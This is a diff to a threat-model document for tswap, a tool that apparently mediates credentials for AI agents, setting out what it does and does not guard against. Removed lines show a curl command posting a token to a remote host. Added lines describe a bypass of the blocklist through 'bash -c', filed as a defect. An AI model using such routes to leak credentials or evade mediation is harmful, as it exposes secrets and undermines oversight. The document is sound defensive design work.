@@ -2,10 +2,16 @@
 
 What tswap defends against, what it does not, and why the line sits where it does.
 
-This exists because most scope questions about tswap turn out to be threat-model questions in
-disguise — "should we integrate with X", "should unlock require a touch", "is this configuration
-safe" — and they are much easier to settle against a written model than from first principles each
-time. Read this before proposing a security feature or arguing one is missing.
+**`README.md` §Threat Model & Non-Goals is the user-facing statement** — the protects-against and
+does-not-protect-against tables, and the shallow-blocklist design rationale. Read that first; it is
+authoritative on *what* the boundaries are and is not repeated here.
+
+This document is the *why* behind those boundaries: who the adversary is, what harm is actually
+being prevented, and how to settle the scope questions that keep recurring — "should we integrate
+with X", "should unlock require a touch", "is this configuration safe". Those turn out to be
+threat-model questions in disguise, and they are far easier to answer against a written model than
+from first principles each time. Read this before proposing a security feature or arguing one is
+missing.
 
 ## The adversary
 
@@ -108,21 +114,23 @@ problem and easy to overlook:
 
 ## What tswap does not guarantee
 
-Being explicit here is what keeps the guarantee above credible.
+`README.md` §What tswap does NOT protect against is the full list — determined local root,
+sophisticated exfiltration through legitimate programs, process memory, compromised YubiKey
+firmware, network interception, offline brute force. Two additions that follow from the adversary
+model rather than from the mechanics:
 
-- **It is not a sandbox.** An agent with shell access can do many things tswap does not mediate.
-- **It does not prevent an authorized use from being harmful.** `tswap run -- curl -d {{token}}
-  https://somewhere` passes every check by design: `curl` is a legitimate program and using a
-  credential against a remote endpoint is the intended use case. tswap cannot distinguish the task
-  from a mistake, and a human pressing a touch button cannot either.
-- **It does not defend against a deliberately adversarial agent.** One actively trying to defeat
-  mediation — building novel exfiltration channels, exploiting the substitution machinery — is out
-  of scope, and designing against it would produce a different and probably unusable product.
 - **It is not change control.** An ops agent given production credentials can change production.
   tswap keeps the credential out of the agent's context; it does not review, gate, or limit what
   the agent does with the access it was legitimately handed. That is a different tool.
 - **It is not perfect, and does not need to be.** The bar is defence in depth against the paths a
   greedy-but-well-meaning agent actually takes.
+
+The distinction that matters when triaging a reported gap: the blocklist being **shallow** is
+by design (README §Design rationale) — `curl`, `python` and custom binaries can exfiltrate, and
+deep shell analysis is explicitly not attempted. But the blocklist **failing at its own stated
+job** is a defect. `run -- bash -c 'echo $X'` is the second kind: `echo` is on the list precisely
+to catch that mistake, and the interpreter walks around it (#105). "We don't sandbox" is not a
+reason to leave that unfixed.
 
 ## What follows from this
 
